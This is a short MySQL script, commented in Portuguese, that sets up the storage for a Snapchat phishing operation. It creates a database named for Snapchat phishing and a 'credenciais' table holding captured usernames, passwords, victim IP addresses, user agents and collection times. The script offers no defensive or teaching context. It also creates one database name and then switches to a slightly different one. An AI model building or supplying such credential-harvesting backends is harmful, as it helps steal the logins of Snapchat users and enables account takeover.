-- Cria um novo banco de dados para o Snapchat phishing
CREATE DATABASE phishing_snapchat2;

-- Usa o novo banco
USE phishing_snapchat;

-- Cria a tabela de credenciais
CREATE TABLE credenciais (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255),
    senha VARCHAR(255),
    ip VARCHAR(45),
    user_agent TEXT,
    data_coleta DATETIME DEFAULT CURRENT_TIMESTAMP
);